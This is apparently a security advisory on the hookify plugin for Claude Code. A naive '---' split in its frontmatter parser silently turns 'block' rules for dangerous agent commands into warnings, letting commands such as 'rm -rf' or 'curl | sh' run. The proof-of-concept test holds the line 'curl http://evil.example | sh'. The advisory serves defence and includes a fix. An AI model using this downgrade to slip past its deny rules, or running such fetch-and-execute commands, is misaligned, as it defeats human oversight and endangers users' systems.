### Title
Hookify's naive `---` substring split in `extract_frontmatter` silently downgrades a `action: block` rule into a non-blocking `warn` rule - (File: `plugins/hookify/core/config_loader.py`)

### Summary
`extract_frontmatter` locates YAML frontmatter boundaries with `content.split('---', 2)`, a literal substring split rather than a line-anchored delimiter match. If any field value inside the frontmatter block (e.g. a `pattern:` string used to match dangerous commands) contains the literal substring `---`, the split terminates the frontmatter early, silently dropping subsequent keys — including `action: block` — into the unparsed message body. Because `Rule.from_dict` defaults `action` to `"warn"` when the key is absent, and `RuleEngine.evaluate_rules` only treats `action == 'block'` as blocking, a rule file that a reviewer/user believes enforces a hard block is parsed and enforced as a mere warning.

### Finding Description
`extract_frontmatter` (`plugins/hookify/core/config_loader.py:87-103`) does:
```python
parts = content.split('---', 2)
frontmatter_text = parts[1]
message = parts[2].strip()
``` [1](#0-0) 

This splits on any occurrence of the three-character substring `---`, anywhere in the file, not only on lines consisting solely of `---` as required by conventional frontmatter delimiters. If a rule author (or an attacker who supplies the rule file via repository content, e.g. a PR adding a `.claude/hookify.*.local.md` file) includes a value such as `pattern: "curl ... # --- suspicious"` before the `action: block` line, the second literal `---` inside that value is consumed as the closing delimiter. Everything after it — including `action: block` — is pushed into `parts[2]`, which becomes the plain message body and is never parsed as YAML.

`Rule.from_dict` then computes:
```python
action=frontmatter.get('action', 'warn'),
``` [2](#0-1) 
Since `action` was never populated in `frontmatter`, it silently defaults to `"warn"`.

`RuleEngine.evaluate_rules` then only routes rules with `rule.action == 'block'` into the blocking path; everything else (including this downgraded rule) is treated as a warning that allows the operation to proceed:
```python
if rule.action == 'block':
    blocking_rules.append(rule)
else:
    warning_rules.append(rule)
...
if warning_rules:
    ...
    return {"systemMessage": ...}   # operation still allowed
``` [3](#0-2) 

`load_rules()` automatically globs and loads every `.claude/hookify.*.local.md` file present in the working directory with no additional validation of parse correctness beyond "frontmatter is non-empty":
```python
frontmatter, message = extract_frontmatter(content)
if not frontmatter:
    print(f"Warning: {file_path} missing YAML frontmatter...")
    return None
rule = Rule.from_dict(frontmatter, message)
``` [4](#0-3) 
Because `frontmatter` is non-empty (it still contains `name`, `enabled`, `event`, etc.), no warning is emitted and the malformed rule is silently accepted and loaded into the active rule set used by the `PreToolUse`/`Stop` hooks in `plugins/hookify/hooks/`.

No existing check compares the declared/intended `action` against the actually parsed value, and there is no schema validation, strict-YAML parsing (e.g. `yaml.safe_load`), or a fail-closed default (defaulting missing `action` to `block` would be fail-safe; defaulting to `warn` is fail-open).

### Impact Explanation
Any hookify rule file whose frontmatter can be made to contain an incidental `---` substring in a field value (most plausibly the `pattern`/condition strings meant to detect dangerous commands, e.g. shell heredocs, markdown snippets, or comments) will have its `action: block` clause stripped and default to `warn`. This breaks the stated invariant that "a deny rule must never be parsed into a non-blocking configuration." Concretely, a project/user that relies on hookify to hard-block dangerous `Bash`/`Edit` invocations (e.g. `rm -rf`, `curl | sh`) will instead only receive a `systemMessage` warning while the tool call is still allowed to execute — i.e., unauthorized local command execution that bypasses the intended deny control, matching the "Unauthorized local command execution that bypasses Claude Code approval or deny controls" impact category. Note that hookify is a supplemental plugin-level guard, not Claude Code's core permission engine, so the practical severity is scoped to installations/users who depend on hookify `block` rules as their enforcement layer.

### Likelihood Explanation
Exploitation requires only that a `.claude/hookify.*.local.md` file with the crafted frontmatter exist in the repository/working directory when hookify hooks run — no special privileges are needed since `load_rules()` blindly globs and loads any matching file. This is fully reachable via ordinary repository content (e.g., a rule file added/edited via a PR, or supplied through the `/hookify` command's generated file) and is deterministic/repeatable: the same malformed `---` placement always produces the same silent downgrade, since `extract_frontmatter` has no randomness. The main precondition is that the victim's `hookify` deployment loads this rule file as a `block` rule expecting real enforcement — this is a realistic configuration since blocking dangerous commands is a primary use case for the plugin (see `README.md`/`commands/hookify.md`).

### Recommendation
Rewrite `extract_frontmatter` to detect frontmatter delimiters only on lines that are exactly `---` (e.g. split on `\n---\n` boundaries or use a line-based state machine that only recognizes `line.strip() == '---'`), rather than substring-splitting the whole file. Additionally, use a real, robust YAML parser (`yaml.safe_load`) for the frontmatter block instead of a custom line parser prone to further edge cases. As defense in depth, make `action` fail-closed: if an `action` key is malformed or ambiguous, treat the rule as `block` (or reject/skip loading the whole file with a hard error) rather than silently defaulting to `warn`.

### Proof of Concept
Unit test to add to a hookify test suite (e.g. `plugins/hookify/tests/test_config_loader.py`):
```python
from hookify.core.config_loader import extract_frontmatter, Rule

def test_embedded_dash_dash_dash_downgrades_block_rule():
    content = '''---
name: block-dangerous-curl
enabled: true
event: bash
tool_matcher: Bash
pattern: "curl http://evil.example | sh # --- marker"
action: block
---

BLOCKED: dangerous command detected.
'''
    frontmatter, message = extract_frontmatter(content)
    rule = Rule.from_dict(frontmatter, message)

    # Attacker-controlled embedded '---' truncates frontmatter before
    # the 'action: block' line is parsed.
    assert 'action' not in frontmatter
    # Invariant violated: a rule authored/labeled as block is parsed as warn.
    assert rule.action == 'warn'  # SHOULD be 'block'
```
Integration validation: place the crafted content above into `.claude/hookify.block-curl.local.md` in a cloned repo, then invoke `plugins/hookify/hooks/pretooluse.py` with a `Bash` tool call whose `command` matches the intended dangerous pattern, and assert the hook response contains `"systemMessage"` only (warning) rather than `"hookSpecificOutput": {"permissionDecision": "deny"}`, confirming the dangerous command would be allowed to execute despite the file's intended `block` semantics.
